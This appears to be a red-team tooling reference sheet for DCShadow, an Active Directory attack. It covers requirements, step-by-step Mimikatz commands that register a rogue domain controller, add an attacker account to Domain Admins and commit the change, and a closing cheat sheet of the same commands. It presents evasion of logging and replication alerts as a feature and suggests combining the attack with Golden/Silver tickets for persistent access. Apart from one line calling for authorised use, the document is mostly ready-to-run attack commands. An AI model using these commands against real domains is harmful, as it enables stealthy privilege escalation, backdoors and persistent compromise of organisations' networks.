# DCShadow

**Type:** Active Directory / Domain Controller Attack
**Focus:** Inject malicious changes into AD without triggering traditional replication alerts

---

## 1. Full Feature Overview

* Leverages Microsoft’s Directory Replication Service (DRS)
* Registers a rogue DC to inject changes into AD (users, groups, ACLs)
* Avoids standard logging and replication alerts
* Can be used to escalate privileges, create backdoors, or modify permissions
* Requires AD Enterprise Admin privileges to register rogue DC
* Compatible with PowerShell (DSInternals, PowerView) and Mimikatz

---

## 2. Requirements & Setup

### Requirements

* Windows environment
* Enterprise Admin privileges in AD
* PowerShell 5.1+ or Mimikatz with `dcshadow` module
* Optional: Domain controller access for testing

### Installation

* Mimikatz: `misc::dcshadow`
* PowerShell: `Import-Module .\PowerView.ps1`
* Ensure the AD environment allows replication connections

---

## 3. Core Usage

### 3.1 Using Mimikatz

```text
# Launch Mimikatz
privilege::debug
misc::dcshadow /create /user:Attacker /pwd:Password123 /domain:domain.local
```

### 3.2 Inject Malicious Change

```text
# Example: Add user to Domain Admins
misc::dcshadow /add /object:CN=Attacker,CN=Users,DC=domain,DC=local /attribute:memberOf /value:"CN=Domain Admins,CN=Users,DC=domain,DC=local"
```

### 3.3 Commit Changes

```text
misc::dcshadow /commit
```

### 3.4 Verify Injection

```powershell
# Check group membership
Get-ADUser Attacker -Properties memberof
```

---

## 4. Tips, Tricks, Best Practices

* Use only in lab or authorized environments; extremely stealthy
* Rogue DC must be removed after testing to avoid replication conflicts
* Combine with Golden/Silver tickets for persistent AD access
* Carefully craft injected changes; misuse can break replication
* Monitor replication logs if testing detection methods

---

## 5. Cheat Sheet

```text
# Launch Mimikatz
privilege::debug

# Create rogue DC
misc::dcshadow /create /user:Attacker /pwd:Password123 /domain:domain.local

# Inject user into Domain Admins
misc::dcshadow /add /object:CN=Attacker,CN=Users,DC=domain,DC=local /attribute:memberOf /value:"CN=Domain Admins,CN=Users,DC=domain,DC=local"

# Commit changes
misc::dcshadow /commit

# Verify
Get-ADUser Attacker -Properties memberof
```

---
